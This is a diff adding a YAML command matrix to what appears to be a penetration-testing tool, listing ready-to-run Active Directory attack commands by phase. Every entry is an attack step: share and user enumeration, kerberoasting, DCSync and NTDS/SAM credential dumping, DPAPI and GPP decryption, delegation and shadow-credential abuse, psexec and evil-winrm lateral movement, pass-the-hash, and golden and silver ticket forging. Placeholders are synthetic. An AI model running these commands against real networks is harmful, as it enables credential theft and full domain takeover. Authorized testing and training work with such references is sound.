@@ -1,0 +1,182 @@
+# Yhwach — WADComs-style Windows/AD command matrix. The recall menu for "I hold
+# X, I'm at phase Y — what's the exact command?". Fills the thin lateral-movement
+# area. `yhwach ref wadcoms [--query lateral]` (or -q kerberoast / nxc / dcsync).
+# Source: wadcoms.github.io. Placeholders are synthetic (test.local / john /
+# password123 / 10.10.10.1 / DC01) — never real creds/hosts.
+# `tag` is a QUERY HOOK (matches an interpret/parser tag name); it is NOT a
+# playbook findings_include consumer, so it does not affect the technique graph.
+# Each entry: id, phase, tool, cmd (one line), tag, maps.
+
+# ---- recon / enumeration ---------------------------------------------------
+- id: smb-shares-anon
+  phase: recon
+  tool: netexec
+  cmd: "nxc smb 10.10.10.1 -u '' -p '' --shares"
+  tag: smb_signing_off
+  maps: [T1135]
+- id: smb-passpol
+  phase: recon
+  tool: netexec
+  cmd: "nxc smb 10.10.10.1 -u john -p password123 --pass-pol"
+  tag: domain_users
+  maps: [T1201]
+- id: smb-rid-brute
+  phase: recon
+  tool: netexec
+  cmd: "nxc smb 10.10.10.1 -u john -p password123 --rid-brute"
+  tag: domain_users
+  maps: [T1087.002]
+- id: ldap-anon-dump
+  phase: recon
+  tool: ldapsearch
+  cmd: "ldapsearch -x -H ldap://10.10.10.1 -b 'dc=test,dc=local'"
+  tag: ldap_anon
+  maps: [T1087.002]
+- id: kerbrute-userenum
+  phase: recon
+  tool: kerbrute
+  cmd: "kerbrute userenum -d test.local --dc 10.10.10.1 users.txt"
+  tag: domain_users
+  maps: [T1087.002]
+- id: bloodhound-collect
+  phase: recon
+  tool: bloodhound-python
+  cmd: "bloodhound-python -d test.local -u john -p password123 -c All -ns 10.10.10.1"
+  tag: domain_trust
+  maps: [T1482]
+- id: certipy-find
+  phase: recon
+  tool: certipy
+  cmd: "certipy find -u john@test.local -p password123 -dc-ip 10.10.10.1 -vulnerable -stdout"
+  tag: adcs_vuln
+  maps: [T1649]
+
+# ---- credential access -----------------------------------------------------
+- id: asrep-roast
+  phase: cred-access
+  tool: impacket
+  cmd: "impacket-GetNPUsers test.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1"
+  tag: asreproastable
+  maps: [T1558.004]
+- id: kerberoast
+  phase: cred-access
+  tool: impacket
+  cmd: "impacket-GetUserSPNs test.local/john:password123 -dc-ip 10.10.10.1 -request"
+  tag: kerberoastable
+  maps: [T1558.003]
+- id: dcsync
+  phase: cred-access
+  tool: impacket
+  cmd: "impacket-secretsdump test.local/john:password123@10.10.10.1 -just-dc"
+  tag: dcsync
+  maps: [T1003.006]
+- id: secretsdump-local
+  phase: cred-access
+  tool: impacket
+  cmd: "impacket-secretsdump -sam sam -system sys LOCAL"
+  tag: lsa_defaultpassword
+  maps: [T1003.002]
+- id: gpp-decrypt
+  phase: cred-access
+  tool: gpp-decrypt
+  cmd: "gpp-decrypt <cpassword-from-sysvol>"
+  tag: gpp_password
+  maps: [T1552.006]
+- id: dpapi-masterkey
+  phase: cred-access
+  tool: impacket
+  cmd: "impacket-dpapi masterkey -file <mk> -sid <sid> -password password123"
+  tag: dpapi_master_key
+  maps: [T1555.004]
+
+# ---- privilege escalation --------------------------------------------------
+- id: targeted-kerberoast
+  phase: privesc
+  tool: bloodyAD
+  cmd: "bloodyAD -d test.local -u john -p password123 --host 10.10.10.1 set password TARGET newpass"
+  tag: gpo_control
+  maps: [T1098]
+- id: rbcd-set
+  phase: privesc
+  tool: impacket
+  cmd: "impacket-rbcd -delegate-to 'DC01$' -from 'EVIL$' -action write test.local/john:password123"
+  tag: constrained_delegation
+  maps: [T1134.005]
+- id: shadow-credentials
+  phase: privesc
+  tool: certipy
+  cmd: "certipy shadow auto -u john@test.local -p password123 -account TARGET -dc-ip 10.10.10.1"
+  tag: shadow_cred_target
+  maps: [T1556]
+
+# ---- lateral movement (the thin area this pack fills) ----------------------
+- id: psexec
+  phase: lateral
+  tool: impacket
+  cmd: "impacket-psexec test.local/john:password123@10.10.10.1"
+  tag: admin_access
+  maps: [T1021.002]
+- id: wmiexec
+  phase: lateral
+  tool: impacket
+  cmd: "impacket-wmiexec test.local/john:password123@10.10.10.1"
+  tag: admin_access
+  maps: [T1047]
+- id: smbexec
+  phase: lateral
+  tool: impacket
+  cmd: "impacket-smbexec test.local/john:password123@10.10.10.1"
+  tag: admin_access
+  maps: [T1021.002]
+- id: evil-winrm
+  phase: lateral
+  tool: evil-winrm
+  cmd: "evil-winrm -i 10.10.10.1 -u john -p password123"
+  tag: admin_access
+  maps: [T1021.006]
+- id: pass-the-hash
+  phase: lateral
+  tool: netexec
+  cmd: "nxc smb 10.10.10.1 -u administrator -H <nthash>"
+  tag: admin_access
+  maps: [T1550.002]
+- id: pass-the-ticket
+  phase: lateral
+  tool: impacket
+  cmd: "KRB5CCNAME=t.ccache impacket-psexec -k -no-pass test.local/administrator@DC01"
+  tag: admin_access
+  maps: [T1550.003]
+- id: overpass-the-hash
+  phase: lateral
+  tool: impacket
+  cmd: "impacket-getTGT test.local/john -hashes :<nthash>"
+  tag: admin_access
+  maps: [T1550.002]
+
+# ---- persistence -----------------------------------------------------------
+- id: add-computer-maq
+  phase: persistence
+  tool: impacket
+  cmd: "impacket-addcomputer test.local/john:password123 -computer-name 'EVIL$' -computer-pass password123"
+  tag: machine_account_quota
+  maps: [T1136.002]
+- id: silver-ticket
+  phase: persistence
+  tool: impacket
+  cmd: "impacket-ticketer -nthash <svc_hash> -domain-sid <sid> -domain test.local -spn <spn> administrator"
+  tag: kerberoastable
+  maps: [T1558.001]
+
+# ---- domain dominance ------------------------------------------------------
+- id: golden-ticket
+  phase: dominance
+  tool: impacket
+  cmd: "impacket-ticketer -nthash <krbtgt_hash> -domain-sid <sid> -domain test.local administrator"
+  tag: dcsync
+  maps: [T1558.001]
+- id: ntds-dump
+  phase: dominance
+  tool: impacket
+  cmd: "impacket-secretsdump -ntds ntds.dit -system sys LOCAL"
+  tag: dcsync
+  maps: [T1003.003]
